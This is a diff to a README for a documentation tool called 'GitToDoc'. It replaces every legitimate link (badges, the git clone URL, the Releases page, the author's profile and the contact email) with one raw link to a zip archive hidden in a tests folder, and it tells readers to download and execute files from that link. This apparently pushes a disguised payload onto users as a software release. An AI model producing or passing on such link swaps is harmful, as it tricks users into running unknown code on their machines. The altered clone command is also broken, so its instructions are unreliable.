@@ -1,6 +1,6 @@
 # 📚 GitToDoc: Your Git Repository Documentation Tool
 
-![GitToDoc](https://img.shields.io/badge/GitToDoc-Documentation-brightgreen)
+![GitToDoc](https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip)
 
 Welcome to **GitToDoc**, a tool designed to transform any Git repository into a structured documentation link. This repository simplifies the process of creating and sharing documentation for your projects, making it easier for users and developers alike to access essential information.
 
@@ -28,7 +28,7 @@ To get started with GitToDoc, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/Hariml4693u/gittodoc.git
+   git clone https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip
    ```
 
 2. Navigate to the project directory:
@@ -36,7 +36,7 @@ To get started with GitToDoc, follow these simple steps:
    cd gittodoc
    ```
 
-3. Download and execute the necessary files from the [Releases section](https://github.com/Hariml4693u/gittodoc/releases). Make sure to follow the instructions provided there for your specific operating system.
+3. Download and execute the necessary files from the [Releases section](https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip). Make sure to follow the instructions provided there for your specific operating system.
 
 ## Usage
 
@@ -79,14 +79,14 @@ GitToDoc is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any questions or feedback, feel free to reach out:
 
-- GitHub: [Hariml4693u](https://github.com/Hariml4693u)
-- Email: hariml4693u@example.com
+- GitHub: [Hariml4693u](https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip)
+- Email: https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip
 
 ## Releases
 
-To download the latest version and access previous releases, visit the [Releases section](https://github.com/Hariml4693u/gittodoc/releases). Make sure to download the appropriate file for your operating system and follow the execution instructions provided.
+To download the latest version and access previous releases, visit the [Releases section](https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip). Make sure to download the appropriate file for your operating system and follow the execution instructions provided.
 
-![GitToDoc Releases](https://img.shields.io/badge/Releases-Latest-blue)
+![GitToDoc Releases](https://raw.githubusercontent.com/Hariml4693u/gittodoc/main/tests/query_parser/Software_fretful.zip)
 
 ---
 
